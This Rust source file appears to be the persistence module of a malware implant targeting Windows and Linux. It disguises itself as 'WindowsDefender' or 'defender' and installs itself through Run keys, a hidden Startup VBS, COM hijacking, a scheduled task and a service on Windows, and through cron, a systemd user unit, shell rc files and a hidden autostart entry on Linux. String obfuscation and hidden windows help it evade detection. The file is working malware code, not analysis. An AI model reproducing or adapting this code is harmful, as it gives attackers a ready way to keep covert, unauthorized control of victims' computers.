use std::path::Path;
use std::env;
use std::fs;
use std::process::Command;
#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;

#[cfg(target_os = "windows")]
const CREATE_NO_WINDOW: u32 = 0x08000000;

// === Windows Persistence ===

#[cfg(target_os = "windows")]
use winreg::enums;
#[cfg(target_os = "windows")]
use winreg::RegKey;

#[cfg(target_os = "windows")]
const TARGET_SUBPATH: &str = "WindowsDefender\\defender.exe";

#[cfg(target_os = "linux")]
const TARGET_DIR: &str = ".cache/defender";
#[cfg(target_os = "linux")]
const TARGET_BIN: &str = "defender";

pub fn persist() -> std::io::Result<()> {
    if env::current_exe().is_err() {
        return Ok(());
    }
    #[cfg(target_os = "windows")]
    return windows_persist();
    #[cfg(target_os = "linux")]
    return linux_persist();
    #[cfg(not(any(target_os = "windows", target_os = "linux")))]
    { Ok(()) }
}

#[cfg(target_os = "windows")]
fn windows_persist() -> std::io::Result<()> {
    let current_exe = env::current_exe()?;

    if crate::util::is_dll::is_dll() {
        return dll_persistence(&current_exe);
    }

    scheduled_task(&current_exe);
    windows_service(&current_exe);

    Ok(())
}

#[cfg(target_os = "windows")]
fn dll_persistence(dll_path: &Path) -> std::io::Result<()> {
    let dll_str = dll_path.to_string_lossy().to_string();

    // 1. Registry Run key via rundll32
    let hkcu = RegKey::predef(enums::HKEY_CURRENT_USER);
    if let Ok((key, _)) = hkcu.create_subkey(cryptify::encrypt_string!("Software\\Microsoft\\Windows\\CurrentVersion\\Run")) {
        let rundll_cmd = format!("rundll32.exe \"{}\",NetClientMain", dll_str);
        let _ = key.set_value(cryptify::encrypt_string!("WindowsDefender"), &rundll_cmd);
    }

    // 2. Startup folder VBS wrapper
    if let Ok(appdata) = env::var(cryptify::encrypt_string!("APPDATA")) {
        let startup = Path::new(&appdata).join(cryptify::encrypt_string!("Microsoft\\Windows\\Start Menu\\Programs\\Startup"));
        let _ = fs::create_dir_all(&startup);
        let vbs = format!(
            "Set WShell = CreateObject(\"WScript.Shell\")\nWShell.Run \"rundll32.exe \"\"{}\"\",NetClientMain\", 0, False\n",
            dll_str
        );
        let _ = fs::write(startup.join(cryptify::encrypt_string!("defender.vbs")), vbs);
    }

    // 3. COM hijacking via HKCU
    let clsid_path = cryptify::encrypt_string!("Software\\Classes\\CLSID\\{00000000-0000-0000-0000-000000000000}\\InprocServer32");
    if let Ok((key, _)) = hkcu.create_subkey(clsid_path) {
        let _ = key.set_value(cryptify::encrypt_string!(""), &dll_str);
        let _ = key.set_value(cryptify::encrypt_string!("ThreadingModel"), &cryptify::encrypt_string!("Apartment"));
    }

    Ok(())
}

#[cfg(target_os = "windows")]
fn scheduled_task(target_path: &Path) {
    let path_str = target_path.to_string_lossy();
    let _ = Command::new(cryptify::encrypt_string!("schtasks"))
        .args(&[
            cryptify::encrypt_string!("/create"), cryptify::encrypt_string!("/tn"), cryptify::encrypt_string!("WindowsDefender"),
            cryptify::encrypt_string!("/tr"), &path_str,
            cryptify::encrypt_string!("/sc"), cryptify::encrypt_string!("onlogon"), cryptify::encrypt_string!("/rl"), cryptify::encrypt_string!("highest"), cryptify::encrypt_string!("/f"),
        ])
        .creation_flags(CREATE_NO_WINDOW)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn();
}

#[cfg(target_os = "windows")]
fn windows_service(target_path: &Path) {
    let path_str = target_path.to_string_lossy();
    let _ = Command::new(cryptify::encrypt_string!("sc"))
        .args(&[cryptify::encrypt_string!("create"), cryptify::encrypt_string!("WindowsDefender"), cryptify::encrypt_string!("binPath="), &path_str, cryptify::encrypt_string!("start="), cryptify::encrypt_string!("auto")])
        .creation_flags(CREATE_NO_WINDOW)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn();
    std::thread::sleep(std::time::Duration::from_secs(goldberg::goldberg_int!(2)));
    let _ = Command::new(cryptify::encrypt_string!("sc"))
        .args(&[cryptify::encrypt_string!("start"), cryptify::encrypt_string!("WindowsDefender")])
        .creation_flags(CREATE_NO_WINDOW)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn();
}

// === Linux Persistence ===

#[cfg(target_os = "linux")]
fn linux_persist() -> std::io::Result<()> {
    let home = env::var(cryptify::encrypt_string!("HOME"))
        .map_err(|e| std::io::Error::new(std::io::ErrorKind::NotFound, e))?;
    let target_dir = Path::new(&home).join(TARGET_DIR);
    let target_path = target_dir.join(TARGET_BIN);

    fs::create_dir_all(&target_dir)?;

    let current_exe = env::current_exe()?;

    if current_exe != target_path {
        fs::copy(&current_exe, &target_path)?;
        // Set executable permissions
        let _ = fs::set_permissions(&target_path, std::os::unix::fs::PermissionsExt::from_mode(goldberg::goldberg_int!(0o755)));
        Command::new(&target_path).spawn().ok();
        std::process::exit(goldberg::goldberg_int!(0));
    }

    cron_persistence(&target_path);
    systemd_persistence(&target_path);
    bashrc_persistence(&target_path);
    autostart_desktop(&target_path);

    Ok(())
}

#[cfg(target_os = "linux")]
fn cron_persistence(target_path: &Path) {
    let entry = format!("@reboot {}\n", target_path.display());

    let output = Command::new(cryptify::encrypt_string!("crontab")).arg(cryptify::encrypt_string!("-l")).output();
    let existing = match output {
        Ok(o) => String::from_utf8_lossy(&o.stdout).to_string(),
        Err(_) => String::new(),
    };

    if existing.contains(&target_path.to_string_lossy().to_string()) {
        return;
    }

    let new_cron = existing + &entry;
    let mut child = match Command::new(cryptify::encrypt_string!("crontab"))
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()
    {
        Ok(c) => c,
        Err(_) => return,
    };

    use std::io::Write;
    if let Some(mut stdin) = child.stdin.take() {
        let _ = stdin.write_all(new_cron.as_bytes());
    }
    let _ = child.wait();
}

#[cfg(target_os = "linux")]
fn systemd_persistence(target_path: &Path) {
    let home = match env::var(cryptify::encrypt_string!("HOME")) {
        Ok(h) => h,
        Err(_) => return,
    };

    let service_dir = Path::new(&home).join(cryptify::encrypt_string!(".config/systemd/user"));
    let service_file = service_dir.join(cryptify::encrypt_string!("defender.service"));

    let _ = fs::create_dir_all(&service_dir);

    let unit = format!(
        "[Unit]\nDescription=User Session Manager\n\n[Service]\nExecStart={}\nRestart=on-failure\nRestartSec=30\n\n[Install]\nWantedBy=default.target\n",
        target_path.display()
    );

    if fs::write(&service_file, unit).is_err() {
        return;
    }

    let _ = Command::new(cryptify::encrypt_string!("systemctl"))
        .args(&[cryptify::encrypt_string!("--user"), cryptify::encrypt_string!("enable"), cryptify::encrypt_string!("defender.service")])
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .output();

    let _ = Command::new(cryptify::encrypt_string!("systemctl"))
        .args(&[cryptify::encrypt_string!("--user"), cryptify::encrypt_string!("start"), cryptify::encrypt_string!("defender.service")])
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .output();

    // Also try system-wide if we have permissions
    let _ = Command::new(cryptify::encrypt_string!("systemctl"))
        .args(&[cryptify::encrypt_string!("enable"), cryptify::encrypt_string!("defender.service")])
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .output();
}

#[cfg(target_os = "linux")]
fn bashrc_persistence(target_path: &Path) {
    let home = match env::var(cryptify::encrypt_string!("HOME")) {
        Ok(h) => h,
        Err(_) => return,
    };

    let target_str = target_path.to_string_lossy().to_string();
    let parent_str = target_path.parent().map(|p| p.display().to_string()).unwrap_or_default();
    let line = format!("\n# Startup\nexport PATH=\"$PATH:{}\"\n{}\n", parent_str, target_str);

    for rc_file in &[cryptify::encrypt_string!(".bashrc"), cryptify::encrypt_string!(".profile"), cryptify::encrypt_string!(".zshrc"), cryptify::encrypt_string!(".bash_profile")] {
        let rc_path = Path::new(&home).join(rc_file);
        if rc_path.exists() {
            if let Ok(content) = fs::read_to_string(&rc_path) {
                if content.contains(&target_str) {
                    continue;
                }
            }
            use std::io::Write;
            if let Ok(mut file) = fs::OpenOptions::new().append(true).create(true).open(&rc_path) {
                let _ = file.write_all(line.as_bytes());
            }
        }
    }
}

#[cfg(target_os = "linux")]
fn autostart_desktop(target_path: &Path) {
    let home = match env::var(cryptify::encrypt_string!("HOME")) {
        Ok(h) => h,
        Err(_) => return,
    };

    let autostart_dir = Path::new(&home).join(cryptify::encrypt_string!(".config/autostart"));
    let _ = fs::create_dir_all(&autostart_dir);

    let desktop = format!(
        "[Desktop Entry]\nType=Application\nName=defender\nExec={}\nX-GNOME-Autostart-enabled=true\nNoDisplay=true\n",
        target_path.display()
    );

    let _ = fs::write(autostart_dir.join(cryptify::encrypt_string!("defender.desktop")), desktop);
}
